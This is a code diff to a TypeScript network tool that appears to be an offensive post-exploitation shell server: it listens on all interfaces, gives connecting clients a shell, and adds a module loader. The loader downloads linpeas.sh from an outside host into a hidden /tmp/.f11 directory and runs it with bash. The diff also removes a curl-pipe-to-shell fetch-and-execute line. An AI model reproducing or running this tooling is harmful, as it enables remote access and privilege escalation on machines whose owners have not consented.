@@ -4,11 +4,17 @@ import { spawn, execSync, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWitho
 import os from 'os';
 import fs from 'fs';
 import net from 'net';
+import path from 'path';
 import http from 'http';
+import https from 'https';
 import tty, { ReadStream, WriteStream } from 'tty';
 import stream, { Duplex, Readable, Writable } from 'stream';
 
-const WEB_HOST = 'http://localhost:8000';
+const LOAD_MAP = {
+  linpeas: 'linpeas.sh'
+};
+
+const WEB_HOST = 'https://f11snipe.sh/sh';
 const UNIX_SHELLS = ['bash', 'sh'];
 const UNIX_DEFAULT = 'bin/sh';
 const TMP_DIR = `/tmp/.f11`;
@@ -21,13 +27,15 @@ colors.setTheme({
   info: ['black', 'bgCyan'],
   debug: ['dim', 'cyan', 'italic'],
   error: ['red', 'underline'],
+  module: ['red', 'bold', 'italic'],
   fatal: ['white', 'bgRed', 'bold'],
   prompt: ['trap', 'blue', 'bold'],
   pending: ['trap', 'blue', 'bold', 'strikethrough']
 });
 
 // Constants
-let PROMPT = colors.reset('💀 ') + colors['prompt']('f11>') + colors.reset(' ');
+const DEFAULT_PROMPT = colors.reset('💀 ') + colors['prompt']('f11>') + colors.reset(' ');
+let PROMPT = DEFAULT_PROMPT;
 const NEWLINE = `\r\n`;
 const PORT = 7070;
 const HOST = '0.0.0.0';
@@ -79,6 +87,7 @@ class SnipeSocket {
   public cp: ChildProcessWithoutNullStreams;
   public inShell = false;
   public inSpawn = false;
+  public loaded?: any;
 
   constructor (socket: net.Socket, args: string[] = [], opts?: SpawnOptionsWithoutStdio) {
     this.sock = socket;
@@ -109,15 +118,21 @@ class SnipeSocket {
     return `${this.sock.remoteAddress}:${this.sock.remotePort}`
   }
 
+  public reset(): void {
+    PROMPT = DEFAULT_PROMPT;
+    this.loaded = undefined;
+    this.inShell = false;
+    this.cleanup();
+    this.prompt();
+  }
+
   public command(data: any, cb?: (code: number|null) => void): void {
     if (this.inShell) {
       if (this.cp && this.cp.stdin) {
         const cmd = data.toString().trim();
 
         if (/^(exit|quit)$/i.test(cmd)) {
-          this.inShell = false;
-          this.cleanup();
-          this.prompt();
+          this.reset();
         } else {
           msg('debug', `Send spawn command: ${data}`);
           this.cp.stdin.write(data);
@@ -128,12 +143,102 @@ class SnipeSocket {
     } msg('debug', `Not sending command (not inShell): ${data}`);
   }
 
-  public downrun(file: string, cb?: (code: number|null) => void): void {
-    // this.inShell = true;
-    const url = `${WEB_HOST}/${file}`;
-    // const dwn = `${TMP_DIR}/${file}`;
+  public load(target: string, cb?: (code: number|null) => void): void {
+    if (this.loaded && this.loaded.target === target) {
+      if (cb) cb(0);
+      return;
+    }
 
-    this.shell('/bin/sh -c', [`"$(curl -sSL ${url})"`], { detached: true }, cb);
+    if (!LOAD_MAP[target]) {
+      this.sock.write(colors['warn'](`Missing/unknown module: ${target}`));
+      this.prompt();
+      if (cb) cb(1);
+      return;
+    }
+
+    const file = LOAD_MAP[target];
+    const out = `${TMP_DIR}/${file}`;
+    const url = `${WEB_HOST}/${file}`;
+    const dir = path.dirname(out);
+
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
+
+    msg('debug', `Fetching remote file: ${file} (${url} -> ${out})`);
+
+    this.download(out, url, (err) => {
+      if (err) msg('error', err.message);
+      msg('debug', 'Download Completed');
+
+      if (!this.loaded) {
+        this.loaded = {
+          target,
+          file,
+          out,
+          url,
+          dir,
+          err
+        };
+        PROMPT = colors['rainbow'](this.loaded.target) + colors.reset(' | ') + PROMPT;
+      }
+
+      this.sock.write(NEWLINE);
+      this.sock.write(colors.green(`Loaded: ${target}`));
+      this.sock.write(NEWLINE);
+      // this.sock.write(colors.yellow(`Executing: ${out}`));
+      // this.sock.write(NEWLINE);
+
+      this.prompt();
+      // execSync(`chmod +x ${out}`);
+      // this.run(out, cb);
+
+      // this.spawn('bash', [out], { shell: true, detached: true }, (code) => {
+      //   this.prompt();
+      //   if (cb) cb(code);
+      // });
+    });
+  }
+
+  public run(file, cb?: (code: number|null) => void) {
+    this.load(file, (code) => {
+      msg('debug', `Calling run, after load with code: ${code}`);
+
+      this.spawn('bash', [file], { shell: true, detached: true }, (code) => {
+        this.prompt();
+        if (cb) cb(code);
+      });
+    });
+  }
+
+  public download(file, url, cb?: (err?: Error) => void): http.ClientRequest {
+    let localFile = fs.createWriteStream(file);
+
+    return https.get(url, (response) => {
+      const rep = response.headers['content-length'];
+      var len = rep ? parseInt(rep, 10) : 0;
+      var cur = 0;
+      var total = len / 1048576; //1048576 - bytes in 1 Megabyte
+
+      response.on('data', (chunk) => {
+        cur += chunk.length;
+        this.progress(`Download: ${path.basename(file)}`, cur, len, total);
+      });
+
+      response.on('end', () => {
+        msg('debug', 'Download complete');
+        if (cb) cb();
+      });
+
+      response.pipe(localFile);
+    }).on('error', (err) => {
+      fs.unlinkSync(file);
+      if (cb) cb(err);
+    });;
+  }
+
+  public progress(msg, cur, max, total) {
+    const stamp = colors.yellow(`${msg} - ${(100.0 * cur / max).toFixed(2)}% (${(cur / 1048576).toFixed(2)} MB) of total size: ${total.toFixed(2)} MB`);
+    this.sock.write(`\r${stamp}`);
+    // console.log(`\r${stamp}`);
   }
 
   public prompt(): void {
@@ -203,25 +308,40 @@ class SnipeSocket {
   }
 
   public cleanup(): void {
-    this.cp.removeAllListeners();
-  }
-
-  public linpeas() {
-    this.downrun('linpeas.sh');
-    // this.prompt();
+    this.cp?.removeAllListeners();
   }
 
   public handle(data: Buffer) {
     msg('info', `Handle socket data: ${data}`);
 
-    const cmd = data.toString().trim();
+    const args = data.toString().trim().split(' ').map(p => p.trim());
+
+    if (!args.length) {
+      this.prompt();
+      return;
+    }
+
+    const cmd = args.shift() as string;
 
     if (this.inShell) return;
 
-    if (/^shell$/i.test(cmd)) {
+    if (this.loaded) {
+      if (/^run|load/i.test(cmd)) {
+        this.run(this.loaded.out);
+      } else if (/^stop|unload/i.test(cmd)) {
+        this.cp?.kill();
+        this.reset();
+      }
+    } else if (/^shell$/i.test(cmd)) {
       this.shell();
-    } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
-      this.linpeas();
+    } else if (Object.keys(LOAD_MAP).includes(cmd)) {
+      this.load(cmd);
+    } else if (/^load/i.test(cmd) && args[0]) {
+      if (!args[0]) {
+        this.sock.write(colors.red(`Missing module: "load <module>"`));
+      } else {
+        this.load(args[0]);
+      }
     } else {
       this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
       this.prompt();
